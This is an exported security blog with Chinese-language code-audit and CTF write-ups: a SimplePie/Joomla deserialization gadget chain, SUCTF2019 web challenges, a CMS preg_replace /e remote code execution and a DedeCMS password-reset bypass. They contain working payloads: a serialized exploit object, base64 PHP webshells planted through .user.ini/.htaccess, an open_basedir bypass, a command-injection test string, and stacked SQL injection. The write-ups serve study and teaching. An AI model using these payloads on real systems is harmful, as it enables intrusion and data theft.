remove_dot_segments($input) &#123; $output = ''; while (strpos($input, './') !== false || strpos($input, '/.') !== false || $input === '.' || $input === '..') &#123; // A: If the input buffer begins with a prefix of "../" or "./", then remove that prefix from the input buffer; otherwise, if (strpos($input, '../') === 0) &#123; $input = substr($input, 3); &#125; elseif (strpos($input, './') === 0) &#123; $input = substr($input, 2); &#125; // B: if the input buffer begins with a prefix of "/./" or "/.", where "." is a complete path segment, then replace that prefix with "/" in the input buffer; otherwise, elseif (strpos($input, '/./') === 0) &#123; $input = substr_replace($input, '/', 0, 3); &#125; elseif ($input === '/.') &#123; $input = '/'; &#125; // C: if the input buffer begins with a prefix of "/../" or "/..", where ".." is a complete path segment, then replace that prefix with "/" in the input buffer and remove the last segment and its preceding "/" (if any) from the output buffer; otherwise, elseif (strpos($input, '/../') === 0) &#123; $input = substr_replace($input, '/', 0, 4); $output = substr_replace($output, '', strrpos($output, '/')); &#125; elseif ($input === '/..') &#123; $input = '/'; $output = substr_replace($output, '', strrpos($output, '/')); &#125; // D: if the input buffer consists only of "." or "..", then remove that from the input buffer; otherwise, elseif ($input === '.' || $input === '..') &#123; $input = ''; &#125; // E: move the first path segment in the input buffer to the end of the output buffer, including the initial "/" character (if any) and any subsequent characters up to, but not including, the next "/" character or the end of the input buffer elseif (($pos = strpos($input, '/', 1)) !== false) &#123; $output .= substr($input, 0, $pos); $input = substr_replace($input, '', 0, $pos); &#125; else &#123; $output .= $input; $input = ''; &#125; &#125; return $output . $input; &#125; /** * Replace invalid character with percent encoding * * @access private * @param string $string Input string * @param string $valid_chars Valid characters * @param int $case Normalise case * @return string */ function replace_invalid_with_pct_encoding($string, $valid_chars, $case = SIMPLEPIE_SAME_CASE) &#123; // Normalise case if ($case &amp; SIMPLEPIE_LOWERCASE) &#123; $string = strtolower($string); &#125; elseif ($case &amp; SIMPLEPIE_UPPERCASE) &#123; $string = strtoupper($string); &#125; // Store position and string length (to avoid constantly recalculating this) $position = 0; $strlen = strlen($string); // Loop as long as we have invalid characters, advancing the position to the next invalid character while (($position += strspn($string, $valid_chars, $position)) &lt; $strlen) &#123; // If we have a % character if ($string[$position] === '%') &#123; // If we have a pct-encoded section if ($position + 2 &lt; $strlen &amp;&amp; strspn($string, '0123456789ABCDEFabcdef', $position + 1, 2) === 2) &#123; // Get the the represented character $chr = chr(hexdec(substr($string, $position + 1, 2))); // If the character is valid, replace the pct-encoded with the actual character while normalising case if (strpos($valid_chars, $chr) !== false) &#123; if ($case &amp; SIMPLEPIE_LOWERCASE) &#123; $chr = strtolower($chr); &#125; elseif ($case &amp; SIMPLEPIE_UPPERCASE) &#123; $chr = strtoupper($chr); &#125; $string = substr_replace($string, $chr, $position, 3); $strlen -= 2; $position++; &#125; // Otherwise just normalise the pct-encoded to uppercase else &#123; $string = substr_replace($string, strtoupper(substr($string, $position + 1, 2)), $position + 1, 2); $position += 3; &#125; &#125; // If we don't have a pct-encoded section, just replace the % with its own esccaped form else &#123; $string = substr_replace($string, '%25', $position, 1); $strlen += 2; $position += 3; &#125; &#125; // If we have an invalid character, change into its pct-encoded form else &#123; $replacement = sprintf("%%%02X", ord($string[$position])); $string = str_replace($string[$position], $replacement, $string); $strlen = strlen($string); &#125; &#125; return $string; &#125; /** * Check if the object represents a valid IRI * * @access public * @return bool */ function is_valid() &#123; return array_sum($this-&gt;valid) === count($this-&gt;valid); &#125; /** * Set the scheme. Returns true on success, false on failure (if there are * any invalid characters). * * @access public * @param string $scheme * @return bool */ function set_scheme($scheme) &#123; if ($scheme === null || $scheme === '') &#123; $this-&gt;scheme = null; &#125; else &#123; $len = strlen($scheme); switch (true) &#123; case $len &gt; 1: if (!strspn($scheme, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-.', 1)) &#123; $this-&gt;scheme = null; $this-&gt;valid[__FUNCTION__] = false; return false; &#125; case $len &gt; 0: if (!strspn($scheme, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz', 0, 1)) &#123; $this-&gt;scheme = null; $this-&gt;valid[__FUNCTION__] = false; return false; &#125; &#125; $this-&gt;scheme = strtolower($scheme); &#125; $this-&gt;valid[__FUNCTION__] = true; return true; &#125; /** * Set the authority. Returns true on success, false on failure (if there are * any invalid characters). * * @access public * @param string $authority * @return bool */ function set_authority($authority) &#123; if (($userinfo_end = strrpos($authority, '@')) !== false) &#123; $userinfo = substr($authority, 0, $userinfo_end); $authority = substr($authority, $userinfo_end + 1); &#125; else &#123; $userinfo = null; &#125; if (($port_start = strpos($authority, ':')) !== false) &#123; $port = substr($authority, $port_start + 1); $authority = substr($authority, 0, $port_start); &#125; else &#123; $port = null; &#125; return $this-&gt;set_userinfo($userinfo) &amp;&amp; $this-&gt;set_host($authority) &amp;&amp; $this-&gt;set_port($port); &#125; /** * Set the userinfo. * * @access public * @param string $userinfo * @return bool */ function set_userinfo($userinfo) &#123; if ($userinfo === null || $userinfo === '') &#123; $this-&gt;userinfo = null; &#125; else &#123; $this-&gt;userinfo = $this-&gt;replace_invalid_with_pct_encoding($userinfo, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&amp;\'()*+,;=:'); &#125; $this-&gt;valid[__FUNCTION__] = true; return true; &#125; /** * Set the host. Returns true on success, false on failure (if there are * any invalid characters). * * @access public * @param string $host * @return bool */ function set_host($host) &#123; if ($host === null || $host === '') &#123; $this-&gt;host = null; $this-&gt;valid[__FUNCTION__] = true; return true; &#125; elseif ($host[0] === '[' &amp;&amp; substr($host, -1) === ']') &#123; if (Net_IPv6::checkIPv6(substr($host, 1, -1))) &#123; $this-&gt;host = $host; $this-&gt;valid[__FUNCTION__] = true; return true; &#125; else &#123; $this-&gt;host = null; $this-&gt;valid[__FUNCTION__] = false; return false; &#125; &#125; else &#123; $this-&gt;host = $this-&gt;replace_invalid_with_pct_encoding($host, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&amp;\'()*+,;=', SIMPLEPIE_LOWERCASE); $this-&gt;valid[__FUNCTION__] = true; return true; &#125; &#125; /** * Set the port. Returns true on success, false on failure (if there are * any invalid characters). * * @access public * @param string $port * @return bool */ function set_port($port) &#123; if ($port === null || $port === '') &#123; $this-&gt;port = null; $this-&gt;valid[__FUNCTION__] = true; return true; &#125; elseif (strspn($port, '0123456789') === strlen($port)) &#123; $this-&gt;port = (int) $port; $this-&gt;valid[__FUNCTION__] = true; return true; &#125; else &#123; $this-&gt;port = null; $this-&gt;valid[__FUNCTION__] = false; return false; &#125; &#125; /** * Set the path. * * @access public * @param string $path * @return bool */ function set_path($path) &#123; if ($path === null || $path === '') &#123; $this-&gt;path = null; $this-&gt;valid[__FUNCTION__] = true; return true; &#125; elseif (substr($path, 0, 2) === '//' &amp;&amp; $this-&gt;userinfo === null &amp;&amp; $this-&gt;host === null &amp;&amp; $this-&gt;port === null) &#123; $this-&gt;path = null; $this-&gt;valid[__FUNCTION__] = false; return false; &#125; else &#123; $this-&gt;path = $this-&gt;replace_invalid_with_pct_encoding($path, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&amp;\'()*+,;=@/'); if ($this-&gt;scheme !== null) &#123; $this-&gt;path = $this-&gt;remove_dot_segments($this-&gt;path); &#125; $this-&gt;valid[__FUNCTION__] = true; return true; &#125; &#125; /** * Set the query. * * @access public * @param string $query * @return bool */ function set_query($query) &#123; if ($query === null || $query === '') &#123; $this-&gt;query = null; &#125; else &#123; $this-&gt;query = $this-&gt;replace_invalid_with_pct_encoding($query, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&amp;\'()*+,;=:@/?'); &#125; $this-&gt;valid[__FUNCTION__] = true; return true; &#125; /** * Set the fragment. * * @access public * @param string $fragment * @return bool */ function set_fragment($fragment) &#123; if ($fragment === null || $fragment === '') &#123; $this-&gt;fragment = null; &#125; else &#123; $this-&gt;fragment = $this-&gt;replace_invalid_with_pct_encoding($fragment, 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~!$&amp;\'()*+,;=:@/?'); &#125; $this-&gt;valid[__FUNCTION__] = true; return true; &#125; /** * Get the complete IRI * * @access public * @return string */ function get_iri() &#123; $iri = ''; if ($this-&gt;scheme !== null) &#123; $iri .= $this-&gt;scheme . ':'; &#125; if (($authority = $this-&gt;get_authority()) !== null) &#123; $iri .= '//' . $authority; &#125; if ($this-&gt;path !== null) &#123; $iri .= $this-&gt;path; &#125; if ($this-&gt;query !== null) &#123; $iri .= '?' . $this-&gt;query; &#125; if ($this-&gt;fragment !== null) &#123; $iri .= '#' . $this-&gt;fragment; &#125; if ($iri !== '') &#123; return $iri; &#125; else &#123; return null; &#125; &#125; /** * Get the scheme * * @access public * @return string */ function get_scheme() &#123; return $this-&gt;scheme; &#125; /** * Get the complete authority * * @access public * @return string */ function get_authority() &#123; $authority = ''; if ($this-&gt;userinfo !== null) &#123; $authority .= $this-&gt;userinfo . '@'; &#125; if ($this-&gt;host !== null) &#123; $authority .= $this-&gt;host; &#125; if ($this-&gt;port !== null) &#123; $authority .= ':' . $this-&gt;port; &#125; if ($authority !== '') &#123; return $authority; &#125; else &#123; return null; &#125; &#125; /** * Get the user information * * @access public * @return string */ function get_userinfo() &#123; return $this-&gt;userinfo; &#125; /** * Get the host * * @access public * @return string */ function get_host() &#123; return $this-&gt;host; &#125; /** * Get the port * * @access public * @return string */ function get_port() &#123; return $this-&gt;port; &#125; /** * Get the path * * @access public * @return string */ function get_path() &#123; return $this-&gt;path; &#125; /** * Get the query * * @access public * @return string */ function get_query() &#123; return $this-&gt;query; &#125; /** * Get the fragment * * @access public * @return string */ function get_fragment() &#123; return $this-&gt;fragment; &#125;&#125;function purl($url) &#123; $iri = new SimplePie_IRI($url); return array( 'scheme' =&gt; (string) $iri-&gt;get_scheme(), 'authority' =&gt; (string) $iri-&gt;get_authority(), 'path' =&gt; (string) $iri-&gt;get_path(), 'query' =&gt; (string) $iri-&gt;get_query(), 'fragment' =&gt; (string) $iri-&gt;get_fragment() ); &#125;$a = "whoami || $m='http://yemoli.top';";var_dump(purl($a)); Output 12345678910111213array(5) &#123; ["scheme"]=&gt; string(16) "whoami || ='http" ["authority"]=&gt; string(12) "yemoli.top';" ["path"]=&gt; string(0) "" ["query"]=&gt; string(0) "" ["fragment"]=&gt; string(0) ""&#125; exp编写 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?php class JDatabaseDriverMysqli&#123; protected $disconnectHandlers = array(['SimplePie','init'],'yml'); protected $connection = true; protected $a; function __construct()&#123; $m = new SimplePie(); &#125; function __destruct()&#123; $this-&gt;disconnect(); &#125; public function disconnect() &#123; if ($this-&gt;connection) &#123; foreach ($this-&gt;disconnectHandlers as $h) &#123; call_user_func_array($h, array( &amp;$this)); &#125; //mysqli_close($this-&gt;connection); &#125; $this-&gt;connection = null; &#125;&#125;class JSimplepieFactory&#123; &#125;class JDatabaseDriverMysql &#123;&#125;class SimplePie&#123; var $feed_url="phpinfo()||http://yml.top"; var $javascript = 9999; var $raw_data = true; var $cache = true; var $sanitize; var $cache_name_function = "assert"; function __construct()&#123; $this-&gt;sanitize = new JDatabaseDriverMysql; &#125; function init() &#123; echo 'used!!!'; if ($this-&gt;feed_url !== null) &#123; $parsed_feed_url = parse_url($this-&gt;feed_url); // Decide whether to enable caching if ($this-&gt;cache &amp;&amp; $parsed_feed_url['scheme'] !== '') &#123; $cache = call_user_func(array($this-&gt;cache_class, 'create'), $this-&gt;cache_location, call_user_func($this-&gt;cache_name_function, $this-&gt;feed_url), 'spc'); &#125; &#125; &#125;&#125;$a = new JDatabaseDriverMysqli;echo serialize($a);?&gt; Output 1O:21:"JDatabaseDriverMysqli":3:&#123;s:21:"*disconnectHandlers";a:2:&#123;i:0;a:2:&#123;i:0;s:9:"SimplePie";i:1;s:4:"init";&#125;i:1;s:3:"yml";&#125;s:13:"*connection";b:1;s:4:"*a";N;&#125;]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SUCTF2019部分web题解]]></title>
    <url>%2F2019%2F08%2F19%2FSUCTF2019%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[CheckIn题目是一个上传页面，中间件是nginx，尝试上传正常的图片返回如下结果 很奇怪的是路径下存在index.php，经过测试后发现改题目上传时对图片头也进行了校验，同时检验文件中是否存在&lt;?，搜索利用到这篇文章 http://drops.xmd5.com/static/drops/tips-3424.html 利用.user.ini的设置来解析不是php后缀的文件，同时为了绕过&lt;?的检验使用伪协议 123//.user.iniGIF89aauto_prepend_file="php://filter/convert.base64-decode/resource=12.gif" 12//12.gifGIF89a12PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg== 最后直接读flag就好 EasyPHP题目源码如下 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpfunction get_the_flag()&#123; // webadmin will remove your upload file every 20 min!!!! $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']); if(!file_exists($userdir))&#123; mkdir($userdir); &#125; if(!empty($_FILES["file"]))&#123; $tmp_name = $_FILES["file"]["tmp_name"]; $name = $_FILES["file"]["name"]; $extension = substr($name, strrpos($name,".")+1); if(preg_match("/ph/i",$extension)) die("^_^"); if(mb_strpos(file_get_contents($tmp_name), '&lt;?')!==False) die("^_^"); if(!exif_imagetype($tmp_name)) die("^_^"); $path= $userdir."/".$name; @move_uploaded_file($tmp_name, $path); print_r($path); &#125;&#125;$hhh = @$_GET['_'];if (!$hhh)&#123; highlight_file(__FILE__);&#125;if(strlen($hhh)&gt;18)&#123; die('One inch long, one inch strong!');&#125;if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i', $hhh) ) die('Try something else!');$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die("Almost there!");eval($hhh);?&gt; 正则过滤了绝大部分可用字符串，可以使用多个字符异或进行构造，但是直接调用函数长度明显是不够的，这里可以用GET的方式传入我们想要调用的函数，首先FUZZ出_GET 1234567891011target = "_GET"payload = ""for tar in target: for i in range(255): temp = 233^i if chr(temp) == tar: payload = payload+str(hex(i)) breakhead = "%e9"*4payload = payload.replace("0x","%")print(head+"^"+payload) output 1%e9%e9%e9%e9^%b6%ae%ac%bd 然后有如下代码 12$character_type = count_chars($hhh, 3);if(strlen($character_type)&gt;12) die("Almost there!"); 这里需要使字符串去重后小于等于12，于是构造出如下payload 1$&#123;%e9%e9%e9%e9^%b6%ae%ac%bd&#125;&#123;%bd&#125;(); 然后调用函数 get_the_flag() 并构造上传表单 12345678910111213&lt;html&gt;&lt;body&gt;&lt;form action="http://47.111.59.243:9001/?_=$&#123;%e9%e9%e9%e9^%b6%ae%ac%bd&#125;&#123;%bd&#125;();&amp;%bd=get_the_flag" method="post"enctype="multipart/form-data"&gt;&lt;label for="file"&gt;Filename:&lt;/label&gt;&lt;input type="file" name="file" id="file" /&gt; &lt;br /&gt;&lt;input type="submit" name="submit" value="Submit" /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 上传这里需要绕过图片头和&lt;?的校验，可以用.htaccess 12345678//.htaccess#define xlogo_width 200#define xlogo_height 200AddType application/x-httpd-php .gifphp_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_8dda1f908043a81b3539472e2846b908/evil.gif"//evil.gifGIF89a12PD9waHAgZXZhbCgkX1BPU1RbJ2MnXSk7Pz4= 成功的getshell后访问跟目录时才发现是没有权限的，查看phpinfo的信息可以看到开启了open_basedir 同时还禁用了一些函数 尝试baypass open_basedir并用scandir()查看跟目录文件 1chdir('upload');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/')); 读取flag 1chdir('upload');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));chdir('/');var_dump(file_get_contents('THis_Is_tHe_F14g')); Pythonginx主要代码如下 1234567891011121314151617181920def getUrl(): url = request.args.get("url") host = parse.urlparse(url).hostname if host == 'suctf.cc': return "我扌 your problem? 111" parts = list(urlsplit(url)) host = parts[1] if host == 'suctf.cc': return "我扌 your problem? 222 " + host newhost = [] for h in host.split('.'): newhost.append(h.encode('idna').decode('utf-8')) parts[1] = '.'.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(' ')[0] host = parse.urlparse(finalUrl).hostname if host == 'suctf.cc': return urllib.request.urlopen(finalUrl).read() else: return "我扌 your problem? 333" 我们需要最后利用下面的代码来读取文件 1return urllib.request.urlopen(finalUrl).read() 附上调试代码 12345678910111213from urllib.parse import *url = "file://suctf.cc"host = urlparse(url)print(host.hostname)parts = list(urlsplit(url))print(parts)host = parts[1]print("host:"+host)print(parts)finalUrl = urlunsplit(parts).split(' ')[0]print(finalUrl)host = urlparse(finalUrl).hostnameprint("host:"+host) 根据提示先读取nginx配置文件得到flag路径，然后读取flag easy_sql源码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869&lt;?php session_start(); include_once &quot;config.php&quot;; $post = array(); $get = array(); global $MysqlLink; //GetPara(); $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass); if(!$MysqlLink)&#123; die(&quot;Mysql Connect Error!&quot;); &#125; $selectDB = mysqli_select_db($MysqlLink,$dataName); if(!$selectDB)&#123; die(&quot;Choose Database Error!&quot;); &#125; foreach ($_POST as $k=&gt;$v)&#123; if(!empty($v)&amp;&amp;is_string($v))&#123; $post[$k] = trim(addslashes($v)); &#125; &#125; foreach ($_GET as $k=&gt;$v)&#123; &#125; &#125; //die(); ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/a&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php if(isset($post[&apos;query&apos;]))&#123; $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;; //var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;])); if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&apos;query&apos;]))&#123; //echo $post[&apos;query&apos;]; die(&quot;Nonono.&quot;); &#125; if(strlen($post[&apos;query&apos;])&gt;40)&#123; die(&quot;Too long.&quot;); &#125; $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;; mysqli_multi_query($MysqlLink,$sql); do&#123; if($res = mysqli_store_result($MysqlLink))&#123; while($row = mysqli_fetch_row($res))&#123; print_r($row); &#125; &#125; &#125;while(@mysqli_next_result($MysqlLink)); &#125; ?&gt; 主要的源码在这里 1234if(strlen($post['query'])&gt;40)&#123; die("Too long."); &#125;$sql = "select ".$post['query']."||flag from Flag"; 看样子应该是堆叠了，但是一直不知道 || 应该怎么用，后来看到这么一篇文章 https://blog.csdn.net/lixora/article/details/60572357 首先设置sql_mode模式为pipes_as_concat，然后来拼接语句，本地实验了一下 自然的题目中对应的$post[‘query’]就是这个 11;set sql_mode=pipes_as_concat;select 1]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[某cms5-5代码执行分析]]></title>
    <url>%2F2019%2F08%2F13%2F%E6%9F%90cms5-5%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[源码分析该处漏洞主要是preg_replace 函数/e模式下存在的代码执行问题，虽然该程序版本较老，但该问题在其他程序中仍时有存在 漏洞触发点在 lib/tool/form.php文件中，关键代码如下： 1234567891011121314function getform($name,$form,$field,$data) &#123; if (get('table') &amp;&amp;isset(setting::$var[get('table')][$name])) $form[$name]=setting::$var[get('table')][$name]; if (get('form') &amp;&amp;isset(setting::$var[get('form')][$name])) $form[$name]=setting::$var[get('form')][$name]; if (isset($form[$name]['default'])) $form[$name]['default']=preg_replace('/\&#123;\?([^&#125;]+)\&#125;/e',"eval('return $1;')",$form[$name]['default']); if (!isset($data[$name]) &amp;&amp;isset($form[$name]['default'])) $data[$name]=@$form[$name]['default']; if (preg_match('/templat/',$name) &amp;&amp;empty($data[$name])) $data[$name]=@$form[$name]['default']; if (@$form[$name]['filetype'] == 'image') &#123; $return=form::upload_image($name,front::post($name) ?front::post($name) : @$data[$name]); &#125; 关键点在于这句 12if (isset($form[$name]['default'])) $form[$name]['default']=preg_replace('/\&#123;\?([^&#125;]+)\&#125;/e',"eval('return $1;')",$form[$name]['default']); 当if条件成立时，就会引发代码执行问题 下面寻找触发getform函数的代码 可以看到该函数存在六处调用，尝试跟进第一处 代码位于 cache/template/default/manage/#guestadd.php 1&lt;?php echo form::getform('catid',$form,$field,$data);?&gt; 该段直接调用了静态方法getform，但目前并不知道 catid是什么，尝试全局搜索 在/lib/table/archive.php中找到了catid 相关的函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485function get_form() &#123; return array( 'catid'=&gt;array( 'selecttype'=&gt;'select', 'select'=&gt;form::arraytoselect(category::option(0,'tolast')), 'default'=&gt;get('catid'), 'regex'=&gt;'/\d+/', 'filter'=&gt;'is_numeric', ), 'typeid'=&gt;array( 'selecttype'=&gt;'select', 'select'=&gt;form::arraytoselect(type::option(0,'tolast')), 'default'=&gt;get('typeid'), 'regex'=&gt;'/\d+/', 'filter'=&gt;'is_numeric', ), 'toppost'=&gt;array( 'selecttype'=&gt;'select', 'select'=&gt;form::arraytoselect(array(0=&gt;'不置顶',2=&gt;'栏目置顶',3=&gt;'全站置顶')), 'default'=&gt;0, 'regex'=&gt;'/\d+/', 'filter'=&gt;'is_numeric', ), 'ishtml'=&gt;array( 'selecttype'=&gt;'radio', 'select'=&gt;form::arraytoselect(array(0=&gt;'继承',1=&gt;'生成',2=&gt;'不生成')), ), 'checked'=&gt;array( 'selecttype'=&gt;'radio', 'select'=&gt;form::arraytoselect(form::yesornotoarray('审核')), ), 'image'=&gt;array( 'filetype'=&gt;'image', ), 'thumb'=&gt;array( 'filetype'=&gt;'thumb', ), 'displaypos'=&gt;array( 'selecttype'=&gt;'checkbox', //'select'=&gt;form::arraytoselect(array(1=&gt;'首页推荐',2=&gt;'首页焦点',3=&gt;'首页头条',4=&gt;'列表页推荐',5=&gt;'内容页推荐')), ), 'htmlrule'=&gt;array( //'tips'=&gt;" 默认：&#123;?category::gethtmlrule(get('id'),'showhtmlrule')&#125;", ), 'template'=&gt;array( 'selecttype'=&gt;'select', 'select'=&gt;form::arraytoselect(front::$view-&gt;archive_tpl_list('archive/show')), //'tips'=&gt;" 默认：&#123;?category::gettemplate(get('id'),'showtemplate')&#125;", ), 'showform'=&gt;array( 'selecttype'=&gt;'select', 'select'=&gt;form::arraytoselect(get_my_tables_list()), 'default'=&gt;"0", ), 'introduce_len'=&gt;array( 'default'=&gt;config::get('archive_introducelen') ), 'attr1'=&gt;array( 'selecttype'=&gt;'checkbox', 'select'=&gt;form::arraytoselect($this-&gt;getattrs(1)), ), 'grade'=&gt;array( 'selecttype'=&gt;'radio', 'select'=&gt;form::arraytoselect(array(0,1,2,3,4,5)), ), 'pics'=&gt;array( 'filetype'=&gt;'image2', ), 'author'=&gt;array( 'tips'=&gt;' ', ), 'attr3'=&gt;array( 'tips'=&gt;' ', ), 'htmlrule'=&gt;array( 'selecttype'=&gt;'select', 'select'=&gt;form::arraytoselect(getHtmlRule('archive')), 'default'=&gt;'', ), 'tag_option'=&gt;array( 'selecttype'=&gt;'select', 'select'=&gt;form::arraytoselect(tag::getTags()), ), ); &#125; 注意到这一句 1'default'=&gt;get('catid'), 跟进get函数 12345678910function get($var) &#123; if (front::get($var)) return front::get($var); else if (front::post($var)) return front::post($var); else if (config::get($var)) return config::get($var); else if (session::get($var)) return session::get($var);&#125; 继续跟进 123456789101112static function get($var) &#123; if (isset(self::$get[$var])) return self::$get[$var]; else return false; &#125;static function post($var) &#123; if (isset(self::$post[$var])) return self::$post[$var]; else return false; &#125; 最后跟进到front类中__construct()函数 123//关键语句self::$get=$_GET;self::$post=$_POST; 这就说明catid和defult的值都是我们可以控制的，这样我们就可以通过控制$form[$name(catid)] [‘default’]来达到执行任意代码的目的 此时我们需要寻找一个触发get_form()函数的地方，并且再触发该函数后需要引用guestadd.php页面以此衔接我们的利用操作，全局搜索后定位在 /lib/default/manage_act.php ，该文件在第29行对get_form()函数进行了调用 1$this-&gt;view-&gt;form=$this-&gt;_table-&gt;get_form(); 同时在/lib/tool/front_class.php 文件的front类中存在这样的代码 123if (@$_GET['g'] &amp;&amp;is_numeric(@$_GET['g'])) &#123; header('location: ?case=manage&amp;act=guestadd&amp;manage=archive&amp;guest=1');&#125; 该文件是网站入口文件index.php所引用的，所以我们访问如下url即可触发 1http://localhost/?g=1 接着会被重定向为这样： 1http://localhost/index.php?case=manage&amp;act=guestadd&amp;manage=archive&amp;guest=1 这时只要post过去符合正则匹配的代码就可以了 123'/\&#123;\?([^&#125;]+)\&#125;/e'//该段正则表达式即为匹配&#123;?任意内容&#125;,当post如下语句时就会触发执行//catid=&#123;?(phpinfo())&#125; 梳理一下利用过程： 12345index.php-&gt;(/lib/tool/front_class.php)-&gt;(/lib/default/manage_act.php)[-&gt;get_form()]-&gt;(cache/template/default/manage/#guestadd.php)[-&gt;getform('catid'...)]-&gt;(lib/tool/form.php)[preg_reolace()]//RCE 后记当我们传入{?(phpinfo())}时，函数会变成这样 1preg_replace('/\&#123;\?([^&#125;]+)\&#125;/e',"eval('return $1;')","&#123;?(phpinfo())&#125;"); 匹配成功后会执行eval(‘return $1;’) 而(phpinfo())在正常情况下同样会执行 执行成功会返回true这样前面的eval(‘return $1;’)就相当于eval(‘return phpinfo();’)，所以出现了代码执行]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DedeCms5-7任意用户密码重置分析]]></title>
    <url>%2F2019%2F08%2F06%2FDedeCms5-7%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[代码分析漏洞利用点主要是php弱类型的判断缺陷，漏洞代码位于 member\resetpassword.php 主要代码如下 123456789101112131415161718192021else if($dopost == "safequestion")&#123; $mid = preg_replace("#[^0-9]#", "", $id); $sql = "SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = '$mid'"; $row = $db-&gt;GetOne($sql); if(empty($safequestion)) $safequestion = ''; if(empty($safeanswer)) $safeanswer = ''; if($row['safequestion'] == $safequestion &amp;&amp; $row['safeanswer'] == $safeanswer) &#123; sn($mid, $row['userid'], $row['email'], 'N'); exit(); &#125; else &#123; ShowMsg("对不起，您的安全问题或答案回答错误","-1"); exit(); &#125;&#125; 1if($row['safequestion'] == $safequestion &amp;&amp; $row['safeanswer'] == $safeanswer) 在该处使用了双等号进行判断，因此我们可以利用弱类型的特性进行绕过，默认注册用户是没有设置安全问题的，我们在数据库看一下默认的值 safequestion的值为0，safeanswer值为空 对于上方的判断 123if(empty($safequestion)) $safequestion = '';if(empty($safeanswer)) $safeanswer = ''; 最后的safequestion值为0，safeanswer值为空，这样对于safequestion，我们可以使用0.0 0.这样的字符串使他们强制转换为int后变为0 达到绕过判断的目的，而对于safeanswer我们直接置空就好 绕过之后我们会进入sn()函数 1sn($mid, $row['userid'], $row['email'], 'N'); 定位函数，该函数在/member/inc/inc_pwd_functions.php中，代码如下 1234567891011121314151617181920212223function sn($mid,$userid,$mailto, $send = 'Y')&#123; global $db; $tptim= (60*10); $dtime = time(); $sql = "SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'"; $row = $db-&gt;GetOne($sql); if(!is_array($row)) &#123; //发送新邮件； newmail($mid,$userid,$mailto,'INSERT',$send); &#125; //10分钟后可以再次发送新验证码； elseif($dtime - $tptim &gt; $row['mailtime']) &#123; newmail($mid,$userid,$mailto,'UPDATE',$send); &#125; //重新发送新的验证码确认邮件； else &#123; return ShowMsg('对不起，请10分钟后再重新申请', 'login.php'); &#125;&#125; 首先该函数会在#@__pwd_tmp表中查询是否存在临时密码，当我们第一次重置密码时，该表中是没有值的，而后通过下面的判断，我们自然的进入了newmail函数 1newmail($mid,$userid,$mailto,'INSERT',$send); 该函数同样在/member/inc/inc_pwd_functions.php 中，代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051function newmail($mid, $userid, $mailto, $type, $send)&#123; global $db,$cfg_adminemail,$cfg_webname,$cfg_basehost,$cfg_memberurl; $mailtime = time(); $randval = random(8); $mailtitle = $cfg_webname.":密码修改"; $mailto = $mailto; $headers = "From: ".$cfg_adminemail."\r\nReply-To: $cfg_adminemail"; $mailbody = "亲爱的".$userid."：\r\n您好！感谢您使用".$cfg_webname."网。\r\n".$cfg_webname."应您的要求，重新设置密码：（注：如果您没有提出申请，请检查您的信息是否泄漏。）\r\n本次临时登陆密码为：".$randval." 